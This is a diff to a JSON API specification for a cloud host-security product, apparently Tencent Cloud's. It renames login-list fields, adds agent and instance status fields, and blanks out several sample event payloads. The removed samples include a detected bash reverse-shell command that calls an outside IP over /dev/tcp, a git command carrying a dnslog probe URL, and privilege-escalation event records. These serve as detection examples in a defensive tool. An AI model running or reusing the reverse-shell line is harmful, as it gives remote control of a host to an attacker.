@@ -1331,9 +1331,9 @@
       "status": "online"
     },
     "DescribeHostLoginList": {
-      "document": "获取登录审计列表",
+      "document": "获取异常登录列表",
       "input": "DescribeHostLoginListRequest",
-      "name": "获取登录审计列表",
+      "name": "获取异常登录列表",
       "output": "DescribeHostLoginListResponse",
       "status": "online"
     },
@@ -22744,7 +22744,7 @@
         {
           "disabled": false,
           "document": "事件详情",
-          "example": "{\"Uuid\": \"3253189e-a107-4892-9bb9-03ad9d3e****\", \"Id\": 91212998, \"Quuid\": \"3253189e-a107-4892-9bb9-03ad9d3e****\", \"HostIp\": \"172.16.4****\", \"Platform\": 4, \"BashCmd\": \"sh -c bash -i \\\\u003e\\\\u0026 /dev/tcp/106.55.235.95/3389 0\\\\u003e\\\\u0****\", \"RuleId\": 27, \"RuleName\": \"\\u7cfb\\u7edf\\u89c4\\u5219(\\u6807\\u51c6)-\\u53cd\\u5f39shell.bash\\u53cd\\u5f39s****\", \"RuleLevel\": 1, \"Status\": 1, \"CreateTime\": \"2023-04-15 05:0****\", \"Exe\": \"/usr/bi****\", \"ModifyTime\": \"2023-10-14 02:3****\", \"PsTree\": \"null\", \"User\": \"root\", \"Pid\": \"1771645\", \"DetectBy\": \"1\", \"RegexBashCmd\": \"sh -c bash -i \\\\u003e\\\\u0026 /dev/tcp/106\\\\\\\\.55\\\\\\\\.235\\\\\\\\.95/3389 0\\\\u003e\\\\u0****\", \"RuleCategory\": 0, \"MachineName\": \"TCSS P0\\u81ea\\u52a8\\u5316_\\u6b63\\u5f0f\\u73af****\", \"SuggestScheme\": \"1\\u3001\\u68c0\\u67e5\\u6076\\u610f\\u8fdb\\u7a0b\\u53ca\\u975e\\u6cd5\\u7aef\\u53e3\\uff0c\\u5220\\u9664\\u53ef\\u7591\\u7684\\u542f\\u52a8\\u9879\\u548c\\u5b9a\\u65f6\\u4efb\\u52a1\\uff1b\\\\n2\\u3001\\u9694\\u79bb\\u6216\\u8005\\u5220\\u9664\\u76f8\\u5173\\u7684\\u6728\\u9a6c\\u6587\\u4ef6\\uff1b\\\\n3\\u3001\\u5bf9\\u7cfb\\u7edf\\u8fdb\\u884c\\u98ce\\u9669\\u6392\\u67e5\\uff0c\\u5e76\\u8fdb\\u884c\\u5b89\\u5168\\u52a0\\u56fa\\uff0c\\u8be6\\u60c5\\u53ef\\u53c2\\u8003\\u5982\\u4e0b\\u94fe\\u63a5\\uff1a\\u00a0\\\\n\\u3010Linux\\u3011https://cloud.tencent.com/document/product/296/9604\\u00a0\\\\n\\u3010Windows\\u3011https://cloud.tencent.com/document/product/296/****\", \"HarmDescribe\": \"\\u9ed1\\u5ba2\\u5728\\u5165\\u4fb5\\u670d\\u52a1\\u5668\\u540e\\uff0c\\u4e3a\\u4e86\\u8fdb\\u884c\\u4e0b\\u4e00\\u6b65\\u7684\\u6076\\u610f\\u64cd\\u4f5c\\uff0c\\u4f1a\\u6267\\u884c\\u6076\\u610f\\u6587\\u4ef6\\u4e0b\\u8f7d\\u3001\\u8fde\\u63a5\\u77ff\\u6c60\\u3001\\u6dfb\\u52a0\\u516c\\u94a5\\u3001\\u67e5\\u770b\\u654f\\u611f\\u6587\\u4ef6****\", \"Tags\": [], \"References\": [], \"MachineWanIp\": \"101.33.22****\", \"MachineStatus\": \"ONLINE\"}",
+          "example": "无",
           "member": "BashEventsInfo",
           "name": "BashEventsInfo",
           "output_required": true,
@@ -22910,7 +22910,7 @@
         {
           "disabled": false,
           "document": "高危命令事件列表",
-          "example": "[{\"Uuid\": \"2fc9fe2c-2b9c-11ea-83dd-48fd8e5f****\", \"Id\": 137135217, \"Quuid\": \"1ad01e35-55ce-4d0c-8a24-614f3b6b****\", \"Hostip\": \"10.19****\", \"User\": \"git:git\", \"Platform\": 4, \"BashCmd\": \"/opt/gitlab/embedded/bin/git --git-dir /var/opt/gitlab/git-data/repositories/songyueyue/ioshybridapi.git log --pretty=%H --grep=http://xfs.bxss.me?btpoc****\", \"RuleId\": 458, \"RuleName\": \"\\u7cfb\\u7edf\\u89c4\\u5219(\\u6807\\u51c6)-\\u4f7f\\u7528dnslog\\u7b49****\", \"RuleLevel\": 2, \"Status\": 3, \"CreateTime\": \"2023-12-11 12:3****\", \"MachineName\": \"DevOps-Gi****\", \"DetectBy\": 1, \"Pid\": \"3661\", \"Exe\": \"/opt/gitlab/embedded/bin****\", \"ModifyTime\": \"2024-03-22 14:3****\", \"RegexBashCmd\": \"/opt/gitlab/embedded/bin/git --git-dir /var/opt/gitlab/git-data/repositories/songyueyue/ioshybridapi\\\\\\\\.git log --pretty=%H --grep=http://xfs\\\\\\\\.bxss\\\\\\\\.me\\\\\\\\?btpoc\\\\\\\\****\", \"RuleCategory\": 0, \"HostName\": \"gitlab.btpoc****\"}]",
+          "example": "无",
           "member": "BashEvent",
           "name": "List",
           "output_required": true,
@@ -24771,7 +24771,7 @@
         },
         {
           "disabled": false,
-          "document": "过滤条件。<li>Quuid - String - 是否必填：否 - 云服务器uuid</li><li>Uuid - String - 是否必填：否 - 主机安全唯一Uuid</li><li>MachineName - String - 是否必填：否 - 主机别名</li><li>Ip - String - 是否必填：否 - 主机ip</li><li>InstanceID - String - 是否必填：否 - 主机实例ID</li><li>SrcIp - String - 是否必填：否 - 来源ip筛选</li><li>UserName - String - 是否必填：否 - 用户名筛选</li><li>Status - string - 是否必填：否 - 状态筛选1:正常登录；5：已加白,14:已处理，15：已忽略</li><li>LoginTimeBegin - String - 是否必填：否 - 按照修改时间段筛选，开始时间</li><li>LoginTimeEnd - String - 是否必填：否 - 按照修改时间段筛选，结束时间</li><li>RiskLevel - string - 是否必填：否 - 状态筛选0:高危；1：可疑</li>",
+          "document": "过滤条件。<li>Quuid - String - 是否必填：否 - 云服务器uuid</li><li>Uuid - String - 是否必填：否 - 主机安全唯一Uuid</li><li>MachineName - String - 是否必填：否 - 主机别名</li><li>Ip - String - 是否必填：否 - 主机ip</li><li>InstanceID - String - 是否必填：否 - 主机实例ID</li><li>SrcIp - String - 是否必填：否 - 来源ip筛选</li><li>UserName - String - 是否必填：否 - 用户名筛选</li><li>Status - string - 是否必填：否 - 状态筛选：2:待处理；5：已加白,14:已处理，15：已忽略</li><li>LoginTimeBegin - String - 是否必填：否 - 按照修改时间段筛选，开始时间</li><li>LoginTimeEnd - String - 是否必填：否 - 按照修改时间段筛选，结束时间</li><li>RiskLevel - string - 是否必填：否 - 状态筛选0:高危；1：可疑</li>",
           "example": "[{\"Name\": \"Status\", \"Values\": [null], \"ExactMatch\": false}]",
           "member": "Filter",
           "name": "Filters",
@@ -24814,8 +24814,8 @@
         },
         {
           "disabled": false,
-          "document": "登录审计列表",
-          "example": "[             {                 \"Id\": 202008000000022,                 \"Uuid\": \"5cc8e4d2-311f-11ea-922b-98be9421969a\",                 \"MachineIp\": \"10.104.194.49\",                 \"MachineName\": \"v_lwjlin_centos_林\",                 \"UserName\": \"root\",                 \"SrcIp\": \"120.229.227.225\",                 \"Status\": 2,                 \"Country\": 1,                 \"City\": 216,                 \"Province\": 19,                 \"LoginTime\": \"2020-02-20 14:51:35\",                 \"ModifyTime\": \"2020-02-20 14:51:35\",                 \"IsRiskUser\": 0,                 \"Port\": 22,                 \"Location\": \"中国:广东省:深圳市\",                 \"Desc\": \"\",                 \"IsRiskSrcIp\": 1,                 \"IsRiskArea\": 1,                 \"Quuid\": \"05f0bcab-726c-4ea4-8109-bcd03d5598f7\",                 \"RiskLevel\": 0,                 \"IsRiskTime\": 1,                 \"MachineExtraInfo\": {                     \"WanIP\": \"1.1.1.1\",                     \"InstanceID\": \"ins-12341234\",                     \"NetworkName\": \"vpc-d7f***\",                     \"PrivateIP\": \"1.1.1.1\",                     \"NetworkType\": 1,                     \"HostName\": \"机器名称\"                 }             }         ]",
+          "document": "异常登录列表",
+          "example": "无",
           "member": "HostLoginList",
           "name": "HostLoginList",
           "output_required": true,
@@ -27791,7 +27791,7 @@
         },
         {
           "disabled": false,
-          "document": "过滤条件。\n<li>Ips - String - 是否必填：否 - 通过ip查询 </li>\n<li>Names - String - 是否必填：否 - 通过实例名查询 </li>\n<li>InstanceIds - String - 是否必填：否 - 通过实例id查询 </li>\n<li>Status - String - 是否必填：否 - 客户端在线状态（OFFLINE: 离线/关机 | ONLINE: 在线 | UNINSTALLED：未安装 | AGENT_OFFLINE 离线| AGENT_SHUTDOWN 已关机）</li>\n<li>Version - String  是否必填：否 - 当前防护版本（ PRO_VERSION：专业版 | BASIC_VERSION：基础版 | Flagship : 旗舰版 | ProtectedMachines: 专业版+旗舰版）</li>\n<li>Risk - String 是否必填: 否 - 风险主机( yes ) </li>\n<li>Os -String 是否必填: 否 - 操作系统( DescribeMachineOsList 接口 值 )\n每个过滤条件只支持一个值，暂不支持多个值“或”关系查询</li>\n<li>Quuid - String - 是否必填: 否 - 云服务器uuid  最大100条.</li>\n<li>AddedOnTheFifteen- String 是否必填: 否 - 是否只查询15天内新增的主机( 1：是) </li>\n<li> TagId- String 是否必填: 否 - 查询指定标签关联的主机列表 </li>",
+          "document": "过滤条件。\n<li>Ips - String - 是否必填：否 - 通过ip查询 </li>\n<li>Names - String - 是否必填：否 - 通过实例名查询 </li>\n<li>InstanceIds - String - 是否必填：否 - 通过实例id查询 </li>\n<li>Version - String  是否必填：否 - 当前防护版本（ PRO_VERSION：专业版 | BASIC_VERSION：基础版 | Flagship : 旗舰版 | ProtectedMachines: 专业版+旗舰版）</li>\n<li>Risk - String 是否必填: 否 - 风险主机( yes ) </li>\n<li>Os -String 是否必填: 否 - 操作系统( DescribeMachineOsList 接口 值 )\n每个过滤条件只支持一个值，暂不支持多个值“或”关系查询</li>\n<li>Quuid - String - 是否必填: 否 - 云服务器uuid  最大100条.</li>\n<li>AddedOnTheFifteen- String 是否必填: 否 - 是否只查询15天内新增的主机( 1：是) </li>\n<li> TagId- String 是否必填: 否 - 查询指定标签关联的主机列表 </li>\n<li> AgentStatus- String 是否必填: 否 - ALL 全部; ONLINE 防护中; OFFLINE 已离线;UNINSTALLED 未安装</li>\n<li> MachineStatus- String 是否必填: 否 - ALL 全部; RUNNING 运行中; STOPPED 已关机; EXPIRED 待回收</li>",
           "example": "[{\"Name\": \"Status\", \"Values\": [\"AGENT_OFF****\"], \"ExactMatch\": true}]",
           "member": "Filter",
           "name": "Filters",
@@ -27816,7 +27816,7 @@
         {
           "disabled": false,
           "document": "主机列表",
-          "example": "[             {                 \"BaselineNum\": 0,                 \"CloudFrom\": 0,                 \"CloudTags\": [                     {                         \"TagKey\": \"Department\",                         \"TagValue\": \"dev\"                     }                 ],                 \"CyberAttackNum\": 0,                 \"HasAssetScan\": 0,                 \"InstanceId\": \"ins-111\",                 \"InstanceState\": \"NORMAL\",                 \"InvasionNum\": 3,                 \"IpList\": \"1.1.1.1\",                 \"IsAddedOnTheFifteen\": 1,                 \"IsProVersion\": false,                 \"KernelVersion\": \"3.10.0-1160.88.1.el7.x86_64\",                 \"LicenseStatus\": 0,                 \"MachineExtraInfo\": {                     \"HostName\": \"demo-instance\",                     \"InstanceID\": \"ins-111\",                     \"NetworkName\": \"vpc-111\",                     \"NetworkType\": 1,                     \"PrivateIP\": \"1.1.1.1\",                     \"WanIP\": \"1.1.1.1\"                 },                 \"MachineIp\": \"1.1.1.1\",                 \"MachineName\": \"test\",                 \"MachineOs\": \"CentOS 7.6 64位\",                 \"MachineStatus\": \"ONLINE\",                 \"MachineType\": \"CVM\",                 \"MachineWanIp\": \"1.1.1.1\",                 \"MalwareNum\": 0,                 \"PayMode\": \"POSTPAY\",                 \"ProjectId\": 0,                 \"ProtectType\": \"BASIC_VERSION\",                 \"Quuid\": \"3377add2-ee61-4c9a-99a3-************\",                 \"RegionInfo\": {                     \"Region\": \"ap-nanjing\",                     \"RegionCode\": \"nj\",                     \"RegionId\": 33,                     \"RegionName\": \"华东地区（南京）\",                     \"RegionNameEn\": \"East China (Nanjing)\"                 },                 \"Remark\": \"do not remove\",                 \"SecurityStatus\": \"RISK\",                 \"Tag\": [                     {                         \"Rid\": 1001,                         \"Name\": \"cwp\",                         \"TagId\": 1022                     }                 ],                 \"Uuid\": \"3377add2-ee61-4c9a-99a3-************\",                 \"VpcId\": \"vpc-1dj4***\",                 \"VulNum\": 0             }         ]",
+          "example": "[             {\"Uuid\": \"3377add2-ee61-4c9a-99a3-************\",                 \"VpcId\": \"vpc-1dj4***\"}]",
           "member": "Machine",
           "name": "Machines",
           "output_required": true,
@@ -29019,7 +29019,7 @@
         {
           "disabled": false,
           "document": "本地提权详情",
-          "example": "{             \"Uuid\": \"05f0bcab-726c-4ea4-8109-bcd03d5598f7\",             \"UserName\": \"root\",             \"UserGroup\": \"1000\",             \"ProcessName\": \"privilege\",             \"CmdLine\": \"./privilege\",             \"ParentProcName\": \"bash\",             \"ParentProcUser\": \"1000\",             \"CreateTime\": \"2024-09-06 14:17:45\",             \"Status\": 0,             \"FullPath\": \"/tmp/privilege\",             \"ParentProcGroup\": \"1000\",             \"ParentProcPath\": \"/usr/bin/bash\",             \"PsTree\": \"[{\\\"pid\\\":32528,\\\"exe\\\":\\\"/tmp/a.out\\\",\\\"account\\\":\\\"root:1002\\\",\\\"cmdline\\\":\\\"/tmp/a.out\\\",\\\"ssh_service\\\":\\\"172.16.49.104:22\\\",\\\"ssh_source\\\":\\\"113.108.77.53:12753\\\",\\\"start_time\\\":1715655696}]\",             \"NewCaps\": \"SYS_RAWIO|DAC_OVERRIDE|DAC_READ_SEARCH|FOWNER|FSETID|KILL|SETGID|SETUID|SETPCAP|LINUX_IMMUTABLE|NET_BIND_SERVICE|NET_BROADCAST|NET_ADMIN|NET_RAW|IPC_LOCK|IPC_OWNER|SYS_MODULE|CHOWN|BLOCK_SUSPEND|WAKE_ALARM|SYSLOG|MAC_ADMIN|MAC_OVERRIDE|SETFCAP|AUDIT_CONTROL|AUDIT_WRITE|LEASE|MKNOD|SYS_TTY_CONFIG|SYS_TIME|SYS_RESOURCE|SYS_NICE|SYS_BOOT|SYS_ADMIN|SYS_PACCT|SYS_PTRACE|SYS_CHROOT\",             \"ModifyTime\": \"2024-09-06 14:17:45\",             \"MachineName\": \"机器名称\",             \"ProcFilePrivilege\": \"-rwsr-xr-x\",             \"HostIp\": \"1.1.1.1\",             \"Quuid\": \"05f0bcab-726c-4ea4-8109-bcd03d5598f7\",             \"Id\": 10001,             \"MachineWanIp\": \"1.1.1.1\",             \"SuggestScheme\": \"1、检查系统是否被添加新用户，或者存在异常权限用户；\\n2、检查恶意进程及非法端口，删除可疑的启动项和定时任务；\\n3.隔离或者删除相关的木马文件；\\n4.对系统进行风险排查，并进行安全加固，详情可参考如下链接：xa0\\n【Linux】https://cloud.tencent.com/document/product/296/9604xa0\\n【Windows】https://cloud.tencent.com/document/product/296/9605\",             \"HarmDescribe\": \"黑客在入侵服务器后，为了进行下一步的恶意操作，会通过特定漏洞提升用户权限，或者直接获取root用户权限。\",             \"Tags\": [],             \"References\": [],             \"MachineStatus\": \"ONLINE\"         }",
+          "example": "无",
           "member": "PrivilegeEventInfo",
           "name": "PrivilegeEventInfo",
           "output_required": true,
@@ -29092,7 +29092,7 @@
         {
           "disabled": false,
           "document": "数据列表",
-          "example": "[             {                 \"Pid\": 1,                 \"MachineExtraInfo\": {                     \"HostName\": \"demo-instance\",                     \"InstanceID\": \"ins-1002\",                     \"NetworkName\": \"vpc-1002\",                     \"NetworkType\": 1,                     \"PrivateIP\": \"1.1.1.1\",                     \"WanIP\": \"1.1.1.1\"                 },                 \"Id\": 22,                 \"Uuid\": \"cf59e3c0-b1cc-11e9-baac-525400ca96ee\",                 \"Quuid\": \"b9821ff5-75f0-4939-b21f-13c8d36a725c\",                 \"Hostip\": \"10.0.0.125\",                 \"ProcessName\": \"nginx\",                 \"FullPath\": \"/home/ubuntu/a\",                 \"CmdLine\": \"./a \",                 \"UserName\": \"root\",                 \"UserGroup\": \"ubuntu\",                 \"ProcFilePrivilege\": \"-rwsr-xr-x\",                 \"ParentProcName\": \"bash\",                 \"ParentProcUser\": \"ubuntu\",                 \"ParentProcGroup\": \"ubuntu\",                 \"ParentProcPath\": \"/bin/bash\",                 \"ProcTree\": \"a(root),bash(ubuntu),sshd(ubuntu),sshd(root),sshd(root),init(root)\",                 \"Status\": 0,                 \"CreateTime\": \"2019-08-15 15:27:52\",                 \"MachineName\": \"云鼎_云镜测试机_Linux_4_weikunlin\"             }         ]",
+          "example": "无",
           "member": "PrivilegeEscalationProcess",
           "name": "List",
           "output_required": true,
@@ -30891,7 +30891,7 @@
         {
           "disabled": false,
           "document": "恶意请求事件详情",
-          "example": "{\n    \"Id\": 10368,\n    \"PolicyId\": 0,\n    \"PolicyType\": -1,\n    \"PolicyName\": \"high level\",\n    \"ProtectLevel\": 2,\n    \"HostId\": \"02db9a21-78fe-4a4c-b96f-a11bf819a962\",\n    \"HostName\": \"v_llzlu恶意请求\",\n    \"HostIp\": \"192.168.111.28\",\n    \"WanIp\": \"43.138.255.181\",\n    \"HostStatus\": \"OFFLINE\",\n    \"AgentId\": \"02db9a21-78fe-4a4c-b96f-a11bf819a962\",\n    \"Domain\": \"183.60.95.201\",\n    \"Tags\": [\n        \n    ],\n    \"AccessCount\": 1,\n    \"ThreatDesc\": \"发现主机存在访问恶意IP/域名的行为，您的主机可能已经失陷。\\n恶意IP/域名可能是黑客的远控服务器、恶意软件下载源、矿池地址等。\",\n    \"SuggestSolution\": \"1.检查恶意进程及非法端口，删除可疑的启动项和定时任务；\\n2.隔离或者删除相关的木马文件；\\n3.对系统进行风险排查，并进行安全加固，详情可参考如下链接： \\n【Linux】https://cloud.tencent.com/document/product/296/9604 \\n【Windows】https://cloud.tencent.com/document/product/296/9605\",\n    \"ReferenceLink\": \"https://www.**.com/**\",\n    \"HandleStatus\": 6,\n    \"Pid\": 1387042,\n    \"ProcessName\": \"/usr/bin/ping\",\n    \"ProcessMd5\": \"7f42e35e3065eaa9a58b89e249e8cbc7\",\n    \"CmdLine\": \"ping 183.60.95.201 \",\n    \"FirstTime\": \"2022-09-19 14:57:23\",\n    \"LastTime\": \"2022-09-19 14:57:23\"\n}",
+          "example": "无",
           "member": "RiskDnsEvent",
           "name": "Info",
           "output_required": true,
@@ -38987,13 +38987,22 @@
           "type": "list"
         },
         {
-          "disabled": false,
+          "disabled": true,
           "document": "需要导出的字段",
           "example": "filed_name",
           "member": "string",
           "name": "Fields",
           "required": false,
           "type": "string"
+        },
+        {
+          "disabled": false,
+          "document": "需要导出的字段",
+          "example": "[\"fieldA\",\"fieldB\"]\t",
+          "member": "string",
+          "name": "Where",
+          "required": false,
+          "type": "list"
         }
       ],
       "type": "object"
@@ -43483,6 +43492,26 @@
           "output_required": false,
           "type": "object",
           "value_allowed_null": false
+        },
+        {
+          "disabled": false,
+          "document": "<li> RUNNING 运行中</li>\n<li> STOPPED 已关机</li>\n<li> EXPIRED 待回收</li>",
+          "example": "RUNNING",
+          "member": "string",
+          "name": "InstanceState",
+          "output_required": false,
+          "type": "string",
+          "value_allowed_null": false
+        },
+        {
+          "disabled": false,
+          "document": "<li>ONLINE 已离线 </li>\n<li>OFFLINE 防护中</li>\n<li>UNINSTALLED 未安装客户端</li>",
+          "example": "UNINSTALLED",
+          "member": "string",
+          "name": "AgentState",
+          "output_required": false,
+          "type": "string",
+          "value_allowed_null": false
         }
       ],
       "usage": "out"
@@ -44206,11 +44235,31 @@
         },
         {
           "disabled": false,
-          "document": "主机状态。\n<li>OFFLINE: 离线  </li>\n<li>ONLINE: 在线</li>\n<li>SHUTDOWN: 已关机</li>\n<li>UNINSTALLED: 未防护</li>",
+          "document": "主机状态。 <li>OFFLINE: 离线 </li> <li>ONLINE: 在线</li> <li>SHUTDOWN: 已关机</li> <li>UNINSTALLED: 未防护</li>\t",
           "example": "ONLINE",
           "member": "string",
           "name": "MachineStatus",
           "output_required": true,
+          "type": "string",
+          "value_allowed_null": false
+        },
+        {
+          "disabled": false,
+          "document": "ONLINE 防护中; OFFLINE 已离线;UNINStALLED 未安装",
+          "example": "ONLINE",
+          "member": "string",
+          "name": "AgentStatus",
+          "output_required": false,
+          "type": "string",
+          "value_allowed_null": false
+        },
+        {
+          "disabled": false,
+          "document": "RUNNING 运行中; STOPED 已关机; EXPIRED 待回收\t",
+          "example": "RUNNING",
+          "member": "string",
+          "name": "InstanceStatus",
+          "output_required": false,
           "type": "string",
           "value_allowed_null": false
         },
@@ -45672,6 +45721,26 @@
           "name": "References",
           "output_required": true,
           "type": "list",
+          "value_allowed_null": false
+        },
+        {
+          "disabled": false,
+          "document": "木马文件是否存在",
+          "example": "true",
+          "member": "bool",
+          "name": "FileExists",
+          "output_required": false,
+          "type": "bool",
+          "value_allowed_null": false
+        },
+        {
+          "disabled": false,
+          "document": "木马进程是否存在",
+          "example": "true",
+          "member": "bool",
+          "name": "ProcessExists",
+          "output_required": false,
+          "type": "bool",
           "value_allowed_null": false
         }
       ],
@@ -53639,6 +53708,16 @@
           "name": "CmdLineQuote",
           "output_required": false,
           "type": "string",
+          "value_allowed_null": false
+        },
+        {
+          "disabled": false,
+          "document": "风险等级",
+          "example": "1",
+          "member": "uint64",
+          "name": "RiskLevel",
+          "output_required": false,
+          "type": "int",
           "value_allowed_null": false
         }
       ],
